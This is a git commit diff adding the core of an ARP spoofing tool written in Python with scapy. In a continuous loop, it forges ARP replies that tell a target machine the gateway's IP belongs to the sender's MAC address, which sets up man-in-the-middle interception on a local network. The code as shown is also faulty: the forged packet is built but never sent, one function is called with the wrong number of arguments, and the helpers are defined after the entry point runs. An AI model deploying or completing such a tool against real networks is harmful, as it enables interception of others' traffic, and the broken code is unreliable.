a6029694a764a024da0f6fb51945a9aa9e48de31
AmitaiF <amitaifar@gmail.com>
2020-11-09 09:50:56 +0200

    Added argparser

--- ArpSpoofer.py
+++ ArpSpoofer.py
@@ -1,4 +1,6 @@
+from time import sleep
 import argparse
+from scapy.all import *
 
 def main():
 	parser = argparse.ArgumentParser(description='Spoof ARP tables')
@@ -9,5 +11,45 @@ def main():
 	parser.add_argument('-t', '--target', type=str, help='IP of target', required=True)
 	args = parser.parse_args()
 
+	iface = args.iface
+	src = args.src
+	delay = args.delay
+	gw = args.gw
+	target = args.target
+
+	if not iface:
+		iface = 'eth0'
+	if not src:
+		src = get_if_hwaddr(iface)
+	if not delay:
+		delay = 1
+	if not gw:
+		gw = False
+	
+
+	while True:
+		send_ARP_response(iface, src, target, gw)
+		sleep(delay)
+
+
 if __name__ == "__main__":
 	main()
+
+
+def send_ARP_response(iface, src, target, gw):
+	if not gw:
+		gw_ip = get_gw_ip(iface)
+		send_is_at(iface, target, src, gw_ip)
+
+
+def get_gw_ip(iface):
+	return '192.168.1.1'
+
+def send_is_at(iface, target, src, ip):
+	dst_mac = get_mac_by_ip(iface, target)
+	packet = Ether(dst=dst_mac, src=src) / ARP(op=ARP.is_at, hwsrc=src, psrc=ip, hwdst=dst_mac, pdst=target)
+
+def get_mac_by_ip(dst_ip):
+	my_ip = get_if_addr(conf.iface)
+	response = sr(ARP(op=ARP.who_has, psrc=my_ip, pdst=dst_ip))
+	return response[0][ARP].hwsrc
